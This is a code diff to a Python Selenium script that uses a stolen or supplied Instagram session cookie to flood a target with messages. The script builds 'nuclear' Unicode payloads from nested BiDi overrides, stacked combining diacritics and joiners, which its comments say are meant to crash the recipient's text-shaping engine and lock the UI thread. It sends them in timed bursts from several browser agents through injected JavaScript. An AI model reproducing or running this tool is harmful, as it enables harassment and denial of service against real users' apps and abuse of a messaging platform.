@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (LOGIC-BOMB V64)
-# 📅 STATUS: UI-THREAD-HIJACK | 4-AGENT TOTAL | AWS-CPU-MAX
+# 🚀 PROJECT: PRAVEER.OWNS (SHAPING-NUCLEAR V65)
+# 📅 STATUS: HARFBUZZ-CRASH | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,32 +12,37 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.15)  # 🔥 High Frequency Strike
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.2, 0.5)    
+REST_AFTER_STRIKES = 120   
+REST_DURATION = 4          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_logic_bomb_payload():
-    """Generates a recursive layout block that forces a Main-Thread lock."""
+def get_nuclear_payload():
+    """Generates a payload that targets the HarfBuzz shaping engine and BiDi stack."""
     u_id = random.randint(100, 999)
-    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI
-    # \u200D = ZWJ (Zero Width Joiner)
-    lri, rli, pdi, zwj = "\u2066", "\u2067", "\u2069", "\u200D"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [V64_LOCK:{u_id}]"
+    # \u202D = BDO (BiDi Override) | \u202E = RLO (Right-to-Left Override)
+    # \u034F = CGJ (Combining Grapheme Joiner)
+    # \u0300-\u036F = Combining Diacritics (Stacking marks)
+    bdo, rlo, cgj = "\u202D", "\u202E", "\u034F"
+    marks = "".join([chr(i) for i in range(0x0300, 0x0320)]) # Stacked marks
+    glue = "\u2060"
+    
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SHAPE_LOCK:{u_id}]"
     
     body = []
-    # 250 lines of recursive 'Directional Flip-Flopping'
-    for i in range(250):
-        # We alternate text direction 5 times PER WORD.
-        # This forces the HarfBuzz engine to restart the layout process 1,250 times.
-        nest = f"{lri}PR{pdi}{rli}AV{pdi}{lri}EE{pdi}{rli}R{pdi} {lri}PAPA{pdi} 🌙"
-        body.append(f"{nest} {i}{zwj*5}")
+    # 350 lines of 'Recursive Context Thrashing'
+    for i in range(350):
+        # Every word flips the direction AND stacks 32 diacritics on a single letter.
+        # This forces the browser to re-calculate the 'Grapheme Cluster' 400+ times.
+        nest = f"{bdo}P{marks}{cgj}{rlo}R{marks}{cgj}{bdo}A{marks}{cgj}{rlo}V{marks}{cgj}EER{cgj}"
+        line = f"{nest} PAPA ON TOP 🌙 {i}{glue*5}"
+        body.append(line)
         
-    return f"{header}\n{chr(10).join(body)}".strip()[:9990]
+    return f"{header}\n{glue.join(body)}".strip()[:9998]
 
 def get_driver(agent_id):
     with BROWSER_LAUNCH_LOCK:
@@ -56,20 +61,16 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Bypasses the 'Typing' hang by using a Trusted Event Dispatcher."""
+    """Fires a high-priority JS event to bypass the UI thread queue."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // 1. Reset state
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
-                // 2. Inject payload
                 document.execCommand('insertText', false, arguments[0]);
-                // 3. Force Internal State Update
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                // 4. Force Enter Key
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -91,23 +92,23 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_logic_bomb_payload()
+                payload = get_nuclear_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Logic-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Nuclear-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 60 == 0:
                         driver.refresh()
-                        time.sleep(5)
+                        time.sleep(8)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             try: driver.quit()
             except: pass
-            time.sleep(3)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
